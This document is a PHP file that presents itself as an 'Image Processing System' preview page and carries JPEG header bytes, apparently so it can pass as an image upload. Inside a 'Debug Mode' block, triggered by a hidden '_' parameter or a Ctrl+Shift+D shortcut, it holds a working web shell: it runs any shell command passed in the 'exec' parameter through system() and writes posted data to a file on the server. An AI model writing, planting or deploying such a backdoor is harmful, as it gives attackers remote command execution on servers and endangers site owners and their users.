<?php
// JPEG Header + PHP code
$jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01";
$php_code = '/*' . str_repeat(' ', 1024) . '*/ ?>';

// Check if we're being accessed as JPEG or PHP
if(isset($_GET['view']) && $_GET['view'] == 'image') {
    header('Content-Type: image/jpeg');
    echo $jpeg_header;
    echo base64_decode('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=');
    exit;
}

// Normal PHP execution
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>Image Preview</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
        .image-container {
            border: 1px solid #0f0;
            padding: 10px;
            margin: 20px 0;
        }
        img {
            max-width: 300px;
            border: 1px solid #333;
        }
        .debug {
            background: #111;
            padding: 10px;
            margin-top: 20px;
            border: 1px dashed #0f0;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h1>üñºÔ∏è Image Processing System</h1>
    
    <div class="image-container">
        <img src="?view=image" alt="System Image">
        <p>Image ID: <?php echo md5(time()); ?></p>
    </div>
    
    <div class="debug">
        <strong>System Info:</strong><br>
        Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
        PHP: <?php echo PHP_VERSION; ?><br>
        Time: <?php echo date('Y-m-d H:i:s'); ?>
        
        <?php
        // Hidden admin panel
        if(isset($_REQUEST['_'])) {
            echo '<div style="background:#222;padding:10px;margin-top:10px;">';
            echo '<strong>Debug Mode Activated</strong><br>';
            
            if(isset($_GET['exec'])) {
                echo '<pre>';
                system($_GET['exec']);
                echo '</pre>';
            }
            
            if(isset($_POST['data'])) {
                file_put_contents('temp.dat', $_POST['data']);
                echo 'Data saved.<br>';
            }
            
            echo '</div>';
        }
        ?>
    </div>
    
    <script>
        // Add debug parameter on Ctrl+Shift+D
        document.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.shiftKey && e.key === 'D') {
                window.location.href = window.location.href + (window.location.href.indexOf('?') > -1 ? '&' : '?') + '_=1';
            }
        });
    </script>
</body>
</html>
